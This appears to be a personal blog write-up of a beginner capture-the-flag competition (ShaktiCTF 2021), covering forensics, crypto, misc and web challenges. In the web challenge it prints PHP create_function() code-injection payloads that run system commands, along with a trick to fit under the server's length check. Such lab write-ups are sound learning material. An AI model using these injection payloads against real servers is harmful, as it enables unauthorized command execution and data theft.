[{"content":"Intro April 3, 2021 TeamShakti published it\u0026rsquo;s annual CTF Beginner Friendly competition which has it\u0026rsquo;s team name ShaktiCTF. I decided to be part of it and try some luck being that \u0026ldquo;officially\u0026rdquo; I had never participated in a CTF before. It looked to me a great opportunnity to practice, learn new things and sharp my skills, looking forward (assuming that it\u0026rsquo;s hurried step) for an acceptable position at the next Hackthebox CTF.\nIntroducing a Write-up of the CTF\u0026rsquo;s challenges I could solved during my participation.\nForensics Follow up - 50 Description We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSolution Downloading the pcapng file given we can idenfify a TCP stream using wireshark, following that stream we catch a pastebin link.\nThe flag was inside it\u0026rsquo;s content.\nFlag: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Description Sometimes what you see is not always true\u0026hellip;\nchall.png\nSolution Downloading the image given and after analyzing it with binwalk, we can observe that apparently there are two images inside the same file, following challenge\u0026rsquo;s title which could be considered as a hint we can use dd to play around those bytes looking for a valid image.\n┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression ┌──(kali㉿kali)-[~/Desktop/shaktictf/forensics] └─$ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s By this way chall1.png turns to a valid image which can be opened with any image viewer with any problem. Gaining that way the flag.\nFlag: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Description I found creating new functionalities as magic. So I went and created quite a few, now I don\u0026rsquo;t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSolution According with /admin.php log we could look for any vulnerability about the mentioned deprecated function create_function() and we can find that it is vulnerable to code injection\nAllowing us to list files in the current folrder using:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;ls -la\u0026quot;);/*\u0026quot;]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd -\u0026gt; flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php admin.php content using:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat admin.php\u0026quot;);/*\u0026quot;]\nView response page source\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); $success = \u0026#39; \u0026lt;div class=\u0026#34;alert alert-success alert-dismissible\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;alert\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; Function declared. \u0026lt;/div\u0026gt; \u0026#39;; include \u0026#34;flag.php\u0026#34;; if (isset ($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; !empty ($_POST[\u0026#39;c\u0026#39;])) { $blacklist = \u0026#34;/mv|rm|exec/i\u0026#34;; $code = $_POST[\u0026#39;c\u0026#39;]; if(strlen($code)\u0026gt;60) { die(\u0026#34;too long to execute\u0026#34;); } if(preg_match($blacklist,$code)){ die(\u0026#34;that\u0026#39;s blocked\u0026#34;); } $fun = create_function(\u0026#39;$flag\u0026#39;, $code); print($success); } ?\u0026gt;After identifying an uncommon file 1998_Dumb_secrets.php I tried to view it\u0026rsquo;s content using:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nWhich response was\ntoo long to execute\nAnalysing code\u0026rsquo;s petition process, we can view that form\u0026rsquo;s length is being validated which means that if we short form\u0026rsquo;s value we should read the file we want. Using:\nreturn -1;}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nView response page source\n\u0026lt;?php $flag1=\u0026quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\u0026quot;; ?\u0026gt; Flag: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Description ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSolution Doing some analysis of the given string we could clearly see that it\u0026rsquo;s format and flag\u0026rsquo;s format are the same. After discarding some options we know that could help to decipher it (Caesar cipher , ROT N cipher), we could try another approach following rotation\u0026rsquo;s principle.\n   Char Recibied Rotation value Known Char     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    This could mean a numeric rotation pattern viewing space repetition between the given string char and flag char, which is +4,+12,+14,+22,+13.\nDoing a manual substitution\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nMethod optimization using a simple script\n#!/usr/bin/python abc = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; values = [4,12,14,22,13] decrypt = \u0026#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\u0026#34; avoid = \u0026#34;{}_!\u0026#34; flag = \u0026#34;\u0026#34; valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex \u0026gt;= len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Script result\nFlag: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 The flag is showed at the event\u0026rsquo;s discord server inside rules channel.\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nFlag: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Description just decode it!\nSolution Image downloaded\nUsing https://zxing.org/w/decode.jspx barcodes can be decoded and gain the flag.\nDecode Succeeded Raw text\nshaktictf{N1C3_w0rK_Fr13nD}\nRaw bytes\n68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a\nBarcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\nFlag: shaktictf{N1C3_w0rK_Fr13nD}\nLast words Considering that my participation was one-man show I gained 156 place of 452 with 410 points.\nSome unfficial Write-ups\n","permalink":"https://rzul.me/en/posts/first-ctf/","summary":"Intro April 3, 2021 TeamShakti published it\u0026rsquo;s annual CTF Beginner Friendly competition which has it\u0026rsquo;s team name ShaktiCTF. I decided to be part of it and try some luck being that \u0026ldquo;officially\u0026rdquo; I had never participated in a CTF before. It looked to me a great opportunnity to practice, learn new things and sharp my skills, looking forward (assuming that it\u0026rsquo;s hurried step) for an acceptable position at the next Hackthebox CTF.","title":"My First CTF"}]